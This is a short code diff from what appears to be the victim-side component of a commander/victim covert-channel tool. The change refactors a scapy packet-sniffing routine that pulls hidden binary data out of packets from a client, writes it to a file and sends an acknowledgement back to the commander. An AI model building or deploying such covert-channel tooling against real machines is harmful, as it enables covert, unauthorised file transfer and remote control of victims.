@@ -253,22 +253,22 @@ if __name__ == '__main__':
                     def packet_callback(packet):
                         global filename
                         binary_data = selected_function(packet)
+                        return binary_data
 
-                        if binary_data:
-                            text_data = bin_to_text(binary_data)
-                            with open(filename, constants.APPEND_MODE) as f:
-                                f.write(text_data)
+                    # Start sniffing from the client
+                    received_packets = sniff(filter="src host {}".format(client_address[0]), count=count)
+                    extracted_data = ''.join(packet_callback(packet)
+                                             for packet in received_packets if packet_callback(packet))
 
-                    # Start sniffing for a specific number of packets
-                    sniff(filter="src host {}".format(client_address[0]), prn=packet_callback, count=count)
+                    # Extract Data and covert from binary to text
+                    covert_data_write_to_file(extracted_data, filename)
 
-                    # # Send ACK to commander (if good)
+                    # Send ACK to commander (if good)
                     if is_file_openable(filename):
                         print(constants.TRANSFER_SUCCESS_MSG.format(filename))
                         client_socket.send(constants.VICTIM_ACK.encode())
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
-
 
 
                 # f) Transfer file to Commander
